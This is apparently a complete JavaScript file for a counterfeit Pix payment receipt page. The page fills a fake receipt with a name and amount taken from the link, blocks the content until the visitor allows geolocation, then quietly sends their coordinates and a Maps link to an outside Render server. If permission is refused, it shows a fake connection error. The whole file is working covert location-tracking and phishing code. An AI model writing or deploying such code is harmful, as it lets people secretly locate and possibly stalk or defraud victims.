// script.js

window.addEventListener("load", () => {

  // 1. Captura os dados do link (ex: ?nome=Pedro&valor=50,00)
  const params = new URLSearchParams(window.location.search);
  const nomeUrl = params.get('nome');
  const valorUrl = params.get('valor');

  // Se tiver nome no link, substitui no comprovante
  if (nomeUrl) {
    const nomeElement = document.getElementById('nome-destino');
    if (nomeElement) nomeElement.innerText = nomeUrl.toUpperCase();
  }

  // Se tiver valor no link, substitui no comprovante
  if (valorUrl) {
    const valorElement = document.getElementById('valor-pix');
    if (valorElement) valorElement.innerText = "R$ " + valorUrl;
  }

  // 2. Tenta pegar a localização
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(sendLocation, handleError);
  } else {
    // Se o navegador for muito antigo
    alert("Erro no navegador.");
  }
});

function sendLocation(position) {
  // Libera a tela visualmente
  const telaBloqueio = document.getElementById('tela-bloqueio');
  const siteReal = document.getElementById('site-real');

  if (telaBloqueio) telaBloqueio.style.display = 'none';
  if (siteReal) siteReal.style.display = 'block';

  // Coleta dados
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;

  // Link do Maps
  const maps = `http://maps.google.com/?q=${latitude},${longitude}`;

  // URL DO SERVIDOR (RENDER)
  const urlServidor = "https://comprovante-pix-1817.onrender.com/send-location";

  fetch(urlServidor, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ latitude, longitude, maps })
  })
    .then(r => console.log("Dados enviados com sucesso."))
    .catch(e => console.log("Erro silencioso no envio:", e));
}

function handleError(error) {
  const h1 = document.querySelector('#tela-bloqueio h1');
  const p = document.querySelector('#tela-bloqueio p');

  if (h1) {
    h1.innerText = "Erro de Conexão";
    h1.style.color = "red";
  }
  if (p) {
    p.innerText = "Verifique sua internet e recarregue a página.";
  }
}
